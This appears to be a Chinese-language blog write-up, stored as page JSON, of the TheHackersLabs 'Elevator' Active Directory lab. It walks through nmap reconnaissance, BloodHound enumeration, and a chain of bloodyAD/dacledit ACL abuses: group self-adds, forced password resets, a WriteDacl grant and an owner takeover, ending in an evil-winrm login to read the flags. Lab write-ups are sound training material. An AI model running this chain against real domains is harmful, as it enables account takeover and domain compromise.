{"pageProps":{"postData":{"id":"TheHackersLabsElevator","contentHtml":"<h1>Elevator</h1>\n<blockquote>\n<p><a href=\"https://labs.thehackerslabs.com/machine/126\">https://labs.thehackerslabs.com/machine/126</a></p>\n</blockquote>\n<p><img src=\"/post-images/TheHackersLabsElevator/image.png\" alt=\"image.png\"></p>\n<p>作者给了一个账户</p>\n<pre><code class=\"hljs language-bash\">User john.smith\nPassword Rk436\\#Z4&#x26;\n</code></pre>\n<h2>Recon</h2>\n<h3>PortScan</h3>\n<pre><code class=\"hljs language-bash\">➜  ~ nmap -sP 10.0.250.0/24                  \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-09-29 14:20 CST\nNmap scan report <span class=\"hljs-keyword\">for</span> 10.0.250.1\nHost is up (0.00072s latency).\nMAC Address: 08:00:27:8F:2A:91 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nNmap scan report <span class=\"hljs-keyword\">for</span> 10.0.250.3\nHost is up (0.00057s latency).\nMAC Address: 08:00:27:F5:3D:B0 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nNmap scan report <span class=\"hljs-keyword\">for</span> 10.0.250.4\nHost is up.\nNmap <span class=\"hljs-keyword\">done</span>: 256 IP addresses (3 hosts up) scanned <span class=\"hljs-keyword\">in</span> 28.12 seconds\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜  ~ nmap -sT -min-rate 10000 -p- 10.0.250.3    \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-09-29 14:21 CST\nStrange <span class=\"hljs-built_in\">read</span> error from 10.0.250.3 (104 - <span class=\"hljs-string\">'Connection reset by peer'</span>)\nNmap scan report <span class=\"hljs-keyword\">for</span> 10.0.250.3\nHost is up (0.00098s latency).\nNot shown: 65513 filtered tcp ports (no-response)\nPORT      STATE SERVICE\n53/tcp    open  domain\n80/tcp    open  http\n88/tcp    open  kerberos-sec\n135/tcp   open  msrpc\n139/tcp   open  netbios-ssn\n389/tcp   open  ldap\n445/tcp   open  microsoft-ds\n464/tcp   open  kpasswd5\n593/tcp   open  http-rpc-epmap\n636/tcp   open  ldapssl\n3268/tcp  open  globalcatLDAP\n3269/tcp  open  globalcatLDAPssl\n5985/tcp  open  wsman\n9389/tcp  open  adws\n49664/tcp open  unknown\n49668/tcp open  unknown\n49674/tcp open  unknown\n49676/tcp open  unknown\n49680/tcp open  unknown\n49687/tcp open  unknown\n49692/tcp open  unknown\n49711/tcp open  unknown\nMAC Address: 08:00:27:F5:3D:B0 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜  ~ nmap -sT -A -p $(<span class=\"hljs-built_in\">cat</span> port | awk -F <span class=\"hljs-string\">'/'</span> <span class=\"hljs-string\">'{print $1}'</span> | <span class=\"hljs-built_in\">paste</span> -sd <span class=\"hljs-string\">','</span>) 10.0.250.3     \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-09-29 14:24 CST\nNmap scan report <span class=\"hljs-keyword\">for</span> 10.0.250.3\nHost is up (0.00070s latency).\n\nPORT     STATE SERVICE       VERSION\n53/tcp   open  domain        Simple DNS Plus\n80/tcp   open  http          Microsoft IIS httpd 10.0\n| http-methods: \n|_  Potentially risky methods: TRACE\n|_http-server-header: Microsoft-IIS/10.0\n|_http-title: IIS Windows Server\n88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server <span class=\"hljs-keyword\">time</span>: 2025-09-29 06:24:32Z)\n135/tcp  open  msrpc         Microsoft Windows RPC\n139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: bloodhound.thl, Site: Default-First-Site-Name)\n445/tcp  open  microsoft-ds?\n464/tcp  open  kpasswd5?\n593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp  open  tcpwrapped\n3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: bloodhound.thl, Site: Default-First-Site-Name)\n3269/tcp open  tcpwrapped\n5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-title: Not Found\n|_http-server-header: Microsoft-HTTPAPI/2.0\n9389/tcp open  mc-nmf        .NET Message Framing\nMAC Address: 08:00:27:F5:3D:B0 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice <span class=\"hljs-built_in\">type</span>: general purpose\nRunning (JUST GUESSING): Microsoft Windows 2022|2016|11|10 (95%)\nOS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_11 cpe:/o:microsoft:windows_10\nAggressive OS guesses: Microsoft Windows Server 2022 (95%), Microsoft Windows Server 2016 (91%), Microsoft Windows 11 21H2 (90%), Microsoft Windows 10 (86%)\nNo exact OS matches <span class=\"hljs-keyword\">for</span> host (<span class=\"hljs-built_in\">test</span> conditions non-ideal).\nNetwork Distance: 1 hop\nService Info: Host: ELEVATOR; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n|_clock-skew: -38s\n| smb2-time: \n|   <span class=\"hljs-built_in\">date</span>: 2025-09-29T06:24:37\n|_  start_date: N/A\n|_nbstat: NetBIOS name: ELEVATOR, NetBIOS user: &#x3C;unknown>, NetBIOS MAC: 08:00:27:f5:3d:b0 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n| smb2-security-mode: \n|   3:1:1: \n|_    Message signing enabled and required\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.70 ms 10.0.250.3\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 64.85 seconds\n</code></pre>\n<h3>枚举</h3>\n<p>SMB 枚举，下载了一些文件，不过都是没什么用的</p>\n<p><img src=\"/post-images/TheHackersLabsElevator/image1.png\" alt=\"image.png\"></p>\n<p>查看一下用户权限</p>\n<pre><code class=\"hljs language-bash\">➜  Elevator nxc ldap 10.0.250.3 -u <span class=\"hljs-string\">'john.smith'</span> -p <span class=\"hljs-string\">'Rk436\\#Z4&#x26;'</span>\nLDAP        10.0.250.3      389    ELEVATOR         [*] Windows Server 2022 Build 20348 (name:ELEVATOR) (domain:bloodhound.thl)\nLDAP        10.0.250.3      389    ELEVATOR         [+] bloodhound.thl\\john.smith:Rk436\\#Z4&#x26;\n\n➜  Elevator nxc winrm 10.0.250.3 -u <span class=\"hljs-string\">'john.smith'</span> -p <span class=\"hljs-string\">'Rk436\\#Z4&#x26;'</span>\nWINRM       10.0.250.3      5985   ELEVATOR         [*] Windows Server 2022 Build 20348 (name:ELEVATOR) (domain:bloodhound.thl)\n/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module <span class=\"hljs-keyword\">in</span> 48.0.0.\n  arc4 = algorithms.ARC4(self._key)\nWINRM       10.0.250.3      5985   ELEVATOR         [-] bloodhound.thl\\john.smith:Rk436\\#Z4&#x26; \n</code></pre>\n<p>上 <code>bloodhound</code></p>\n<pre><code class=\"hljs language-bash\">➜  Elevator bloodhound-python -d bloodhound.thl -u <span class=\"hljs-string\">'john.smith'</span> -p <span class=\"hljs-string\">'Rk436\\#Z4&#x26;'</span> -c all --zip -dc bloodhound.thl -ns 10.0.250.3\nINFO: BloodHound.py <span class=\"hljs-keyword\">for</span> BloodHound LEGACY (BloodHound 4.2 and 4.3)\nINFO: Found AD domain: bloodhound.thl\nINFO: Getting TGT <span class=\"hljs-keyword\">for</span> user\nINFO: Connecting to LDAP server: bloodhound.thl\nWARNING: Kerberos auth to LDAP failed, trying NTLM\nINFO: Found 1 domains\nINFO: Found 1 domains <span class=\"hljs-keyword\">in</span> the forest\nINFO: Found 1 computers\nINFO: Connecting to LDAP server: bloodhound.thl\nWARNING: Kerberos auth to LDAP failed, trying NTLM\nINFO: Found 9 <span class=\"hljs-built_in\">users</span>\nINFO: Found 57 <span class=\"hljs-built_in\">groups</span>\nINFO: Found 2 gpos\nINFO: Found 4 ous\nINFO: Found 19 containers\nINFO: Found 0 trusts\nINFO: Starting computer enumeration with 10 workers\nINFO: Querying computer: elevator.bloodhound.thl\nINFO: Done <span class=\"hljs-keyword\">in</span> 00M 01S\nINFO: Compressing output into 20250929144249_bloodhound.zip\n</code></pre>\n<h2>横向移动</h2>\n<h3>ADDSelf</h3>\n<p>允许 <code>john.smith</code> 将自己添加到 <code>Finanzas</code> 组中</p>\n<p><img src=\"/post-images/TheHackersLabsElevator/image2.png\" alt=\"image.png\"></p>\n<pre><code class=\"hljs language-bash\">➜  Elevator bloodyAD -d <span class=\"hljs-string\">'bloodhound.thl'</span> --dc-ip 10.0.250.3 -u <span class=\"hljs-string\">'john.smith'</span> -p <span class=\"hljs-string\">'Rk436\\#Z4&#x26;'</span> add groupMember FINANZAS john.smith\n[+] john.smith added to FINANZAS\n</code></pre>\n<h3>Force Change Password</h3>\n<p>然后 <code>FINANZAS</code> 组队 <code>MARY.JOHNSON</code> 用户有 <code>GenericAll</code> 权限</p>\n<p><img src=\"/post-images/TheHackersLabsElevator/image3.png\" alt=\"image.png\"></p>\n<p>直接修改其密码</p>\n<pre><code class=\"hljs language-bash\">➜  Elevator bloodyAD -d <span class=\"hljs-string\">'bloodhound.thl'</span> --dc-ip 10.0.250.3 -u <span class=\"hljs-string\">'john.smith'</span> -p <span class=\"hljs-string\">'Rk436\\#Z4&#x26;'</span> <span class=\"hljs-built_in\">set</span> password mary.johnson admin12345\n[+] Password changed successfully!\n</code></pre>\n<p>接着 <code>MARY.JOHNSON</code> 又可以修改 <code>ROBERT.WILLIAMS</code> 的密码</p>\n<p><img src=\"/post-images/TheHackersLabsElevator/image4.png\" alt=\"image.png\"></p>\n<pre><code class=\"hljs language-bash\">\t➜  Elevator bloodyAD -d <span class=\"hljs-string\">'bloodhound.thl'</span> --dc-ip 10.0.250.3 -u <span class=\"hljs-string\">'mary.johnson'</span> -p <span class=\"hljs-string\">'admin12345'</span> <span class=\"hljs-built_in\">set</span> password ROBERT.WILLIAMS admin12345\n[+] Password changed successfully!\n</code></pre>\n<h3>WriteDACL 滥用</h3>\n<p><code>ROBERT.WILLIAMS</code> 拥有对 <code>PATRICIA.BROWN</code> 的 <code>WriteDacl</code> 权限</p>\n<p><img src=\"/post-images/TheHackersLabsElevator/image5.png\" alt=\"image.png\"></p>\n<pre><code class=\"hljs language-bash\">➜  Elevator bloodyAD -d <span class=\"hljs-string\">'bloodhound.thl'</span> --dc-ip 10.0.250.3 -u <span class=\"hljs-string\">'ROBERT.WILLIAMS'</span> -p <span class=\"hljs-string\">'admin12345'</span> get writable\n\ndistinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=bloodhound,DC=thl\npermission: WRITE\n\ndistinguishedName: CN=Robert Williams,OU=marketing,DC=bloodhound,DC=thl\npermission: WRITE\n\ndistinguishedName: CN=Patricia Brown,CN=Users,DC=bloodhound,DC=thl\nDACL: WRITE\n</code></pre>\n<p>要将 WriteDacl 滥用到用户对象，您可以授予自己 GenericAll 权限</p>\n<pre><code class=\"hljs language-bash\">➜  Elevator bloodyAD -d <span class=\"hljs-string\">'bloodhound.thl'</span> --dc-ip 10.0.250.3 -u <span class=\"hljs-string\">'ROBERT.WILLIAMS'</span> -p <span class=\"hljs-string\">'admin12345'</span> add genericAll PATRICIA.BROWN ROBERT.WILLIAMS\n[+] ROBERT.WILLIAMS has now GenericAll on PATRICIA.BROWN\n</code></pre>\n<p>再强制修改其密码</p>\n<pre><code class=\"hljs language-bash\">➜  Elevator bloodyAD -d <span class=\"hljs-string\">'bloodhound.thl'</span> --dc-ip 10.0.250.3 -u <span class=\"hljs-string\">'ROBERT.WILLIAMS'</span> -p <span class=\"hljs-string\">'admin12345'</span> <span class=\"hljs-built_in\">set</span> password PATRICIA.BROWN admin12345\n[+] Password changed successfully!\n</code></pre>\n<h3>ADDSelf - 2</h3>\n<p>用户 <code>PATRICIA.BROWN@BLOODHOUND.THL</code> 有权修改组 <code>OPERACIONES@BLOODHOUND.THL</code> 的所有者</p>\n<p><img src=\"/post-images/TheHackersLabsElevator/image6.png\" alt=\"image.png\"></p>\n<p>那么就将其的所有者修改为自己，然后再将自己添加进去</p>\n<pre><code class=\"hljs language-bash\">➜  Elevator bloodyAD -d <span class=\"hljs-string\">'bloodhound.thl'</span> --dc-ip 10.0.250.3 -u <span class=\"hljs-string\">'PATRICIA.BROWN'</span> -p <span class=\"hljs-string\">'admin12345'</span> <span class=\"hljs-built_in\">set</span> owner OPERACIONES PATRICIA.BROWN\n[+] Old owner S-1-5-21-3580157585-956322742-780763674-512 is now replaced by PATRICIA.BROWN on OPERACIONES\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜  Elevator dacledit.py -action <span class=\"hljs-string\">'write'</span> -rights <span class=\"hljs-string\">'WriteMembers'</span> -principal <span class=\"hljs-string\">'PATRICIA.BROWN'</span> -target-dn <span class=\"hljs-string\">'CN=OPERACIONES,OU=OPERACIONES,DC=BLOODHOUND,DC=THL'</span> <span class=\"hljs-string\">'bloodhound.thl'</span>/<span class=\"hljs-string\">'PATRICIA.BROWN'</span>:<span class=\"hljs-string\">'admin12345'</span>\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] DACL backed up to dacledit-20250929-155416.bak\n[*] DACL modified successfully!\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜  Elevator bloodyAD -d <span class=\"hljs-string\">'bloodhound.thl'</span> --dc-ip 10.0.250.3 -u <span class=\"hljs-string\">'PATRICIA.BROWN'</span> -p <span class=\"hljs-string\">'admin12345'</span> add groupMember OPERACIONES PATRICIA.BROWN\n[+] PATRICIA.BROWN added to OPERACIONES\n</code></pre>\n<p>到这里卡住了，因为没有任何路径，SMB 也枚举过了，故查看 WP，发现 <code>OPERACIONES</code> 应该对 Jones 有 <code>genericAll</code> 权限的，但是我这里没有，询问了佬们得知是需要重新导入</p>\n<h3>Force Change Password - 2</h3>\n<p>重新导入后，可以看到对 <code>Jones</code> 有权限了</p>\n<p><img src=\"/post-images/TheHackersLabsElevator/image7.png\" alt=\"image.png\"></p>\n<p>所以是一条路径下来的</p>\n<p><img src=\"/post-images/TheHackersLabsElevator/image8.png\" alt=\"image.png\"></p>\n<p>强制修改密码</p>\n<pre><code class=\"hljs language-bash\">➜  Elevator bloodyAD -d <span class=\"hljs-string\">'bloodhound.thl'</span> --dc-ip 10.0.250.3 -u <span class=\"hljs-string\">'PATRICIA.BROWN'</span> -p <span class=\"hljs-string\">'admin12345'</span> <span class=\"hljs-built_in\">set</span> password MICHAEL.JONES admin12345\n[+] Password changed successfully!\n</code></pre>\n<p>给自己 <code>jones</code> 添加到远程组里</p>\n<pre><code class=\"hljs language-bash\">➜  Elevator bloodyAD -d <span class=\"hljs-string\">'bloodhound.thl'</span> --dc-ip 10.0.250.3 -u <span class=\"hljs-string\">'MICHAEL.JONES'</span> -p <span class=\"hljs-string\">'admin12345'</span> add groupMember <span class=\"hljs-string\">'Usuarios de administración remota'</span> MICHAEL.JONES\n[+] MICHAEL.JONES added to Usuarios de administración remota\n</code></pre>\n<p>使用 <code>evil-winrm</code> 进行登录</p>\n<p><img src=\"/post-images/TheHackersLabsElevator/image9.png\" alt=\"image.png\"></p>\n<pre><code class=\"hljs language-bash\">*Evil-WinRM* PS C:\\Users\\administrador\\desktop> <span class=\"hljs-built_in\">type</span> root.txt\naxxxxxxxxxxxxxxxxxxxxxxxxxxx6\n*Evil-WinRM* PS C:\\Users\\administrador\\desktop> <span class=\"hljs-built_in\">type</span> user.txt\nbxxxxxxxxxxxxxxxxxxxxxxxxxxxe\n</code></pre>\n<h2>总结</h2>\n<p>爽？</p>","title":"TheHackersLabs - Elevator","date":"2025-09-29","updated":"2025-09-29","tags":["TheHackersLabs","Windows","AD"],"categories":"靶机","comments":true,"description":"Elevator https://labs.thehackerslabs.com/machine/126 作者给了一个账户 Recon PortScan 枚举 SMB 枚举，下载了一些文件，不过都是没什么用的 查看一下用户权限 上 bloodhound 横向移动 ADDSelf 允许 john.sm..."},"recentPosts":[{"id":"TheHackersLabsLavaShop","title":"TheHackersLabs - LavaShop","date":"2025-10-20","isEncrypted":false,"year":"2025","month":"10","day":"20"},{"id":"HackMyVMBirdeye","title":"HackMyVM - Birdeye","date":"2025-10-17","isEncrypted":false,"year":"2025","month":"10","day":"17"},{"id":"HackTheBoxSeason8 - Signed","title":"HackTheBox - Season9 - Signed","date":"2025-10-14","isEncrypted":true,"year":"2025","month":"10","day":"14"},{"id":"HackTheBoxSeason8 - TombWatcher","title":"HackTheBox - Machine - TombWatcher","date":"2025-06-08","isEncrypted":false,"year":"2025","month":"10","day":"13"},{"id":"HackTheBoxSeason8 - Certificate","title":"HackTheBox - Machine - Certificate","date":"2025-06-02","isEncrypted":false,"year":"2025","month":"10","day":"13"},{"id":"HackTheBoxSeason9 - Imagery","title":"HackTheBox - Season9 - Imagery","date":"2025-10-04","isEncrypted":true,"year":"2025","month":"10","day":"04"},{"id":"TheHackersLabsTortuga","title":"TheHackersLabs - Tortuga","date":"2025-10-01","isEncrypted":false,"year":"2025","month":"10","day":"01"}]},"__N_SSG":true}